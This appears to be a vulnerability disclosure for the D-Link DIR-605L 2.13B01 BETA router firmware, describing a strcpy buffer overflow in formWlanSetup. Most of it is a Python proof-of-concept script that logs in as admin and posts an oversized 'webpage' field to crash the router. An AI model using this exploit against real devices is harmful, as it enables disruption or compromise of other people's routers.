## Overview

- Manufacturer's website information：https://www.dlink.com/
- Firmware download address ：https://support.dlink.com/resource/SECURITY_ADVISEMENTS/DIR-605L/REVB/DIR-605L_REVB_FIRMWARE_v2.13B01_BETA.zip

## Affected version

D-Link DIR-605L 2.13B01 BETA

## Vulnerability details

In the D-Link DIR-605L 2.13B01 BETA firmware has a buffer overflow vulnerability in the `formWlanSetup` function. The `Var` variable receives the `webpage` parameter from a POST request. However, since the user can control the input of `webpage`, the `strcpy` can cause a buffer overflow vulnerability.

![image-20240926122920218](https://raw.githubusercontent.com/abcdefg-png/images2/main/image-20240926122920218.png)

## POC

```python
import argparse, requests
import sys
import json

if sys.version_info[0] != 3:
    print("Please run the exploit in python3")
    sys.exit(1)

# You can also login with scripts below.
def login():
    login_url = "goform/formLogin"
    url = base_url + "/" + login_url
    print("1. Login: send request to", url)
    login_data = "curTime=1666884522835&FILECODE=a6.jpeg%0D%0A&VERIFICATION_CODE=LSYFZ&login_n=admin&login_pass=YWRtaW4A"
    response = requests.post(url=url, data=login_data, allow_redirects=False)
    print(response.text)


def poc():
    target_url = "goform/formWlanSetup"
    print("2. get target_url:", target_url)
    url = base_url + "/" + target_url
    print("3. send request to", url)
    
    # Using a dictionary to hold multiple parameters
    data = {
        "webpage": "A" * 2000,  # Adjust the number according to your needs
    }
    
    json_data = json.dumps(data)
    print("request body:", json_data)
    response = requests.post(url=url, json=data, allow_redirects=False)
    print(response.text)


if __name__ == "__main__":
    parser = argparse.ArgumentParser(description='Run the exploit')
    parser.add_argument('ip', type=str, default=None, help='The Router IP')
    args = parser.parse_args()

    global base_url
    base_url = "http://{}".format(args.ip)

    # login()
    poc()

```

![image-20240926120958699](https://raw.githubusercontent.com/abcdefg-png/images2/main/image-20240926120958699.png)
